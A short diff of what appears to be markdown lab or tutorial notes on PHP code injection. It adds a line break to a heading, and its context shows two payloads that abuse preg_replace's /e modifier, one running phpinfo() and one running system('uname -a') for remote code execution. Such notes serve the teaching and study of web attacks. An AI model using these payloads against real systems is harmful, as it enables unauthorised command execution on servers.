@@ -15,7 +15,7 @@ Code Injection is the general term for attack types which consist of injecting c
 
 
 ### example 3
-> preg_replace() — Perform a regular expression search and replace
+> preg_replace() — Perform a regular expression search and replace <br>
 **payload** - example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer"  <br>
 **payload** - example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer         - change to RCE
 
